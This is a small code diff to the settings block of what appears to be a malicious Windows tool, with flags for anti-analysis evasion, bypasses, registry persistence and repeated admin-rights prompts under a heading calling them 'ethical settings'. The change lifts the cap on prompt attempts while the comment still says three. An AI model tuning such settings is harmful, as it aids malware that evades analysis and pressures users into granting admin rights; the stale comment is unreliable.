@@ -229,7 +229,7 @@ ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (e
 # ✅ NEW ETHICAL SETTINGS
 REQUEST_ADMIN_FIRST = False
 DISABLE_UAC_BYPASS = True
-MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
+MAX_PROMPT_ATTEMPTS = None     # Limit prompts to 3 attempts instead of 999
 BYPASSES_ENABLED = True
 REGISTRY_ENABLED = True
 PERSISTENT_ADMIN_PROMPT_ENABLED = False
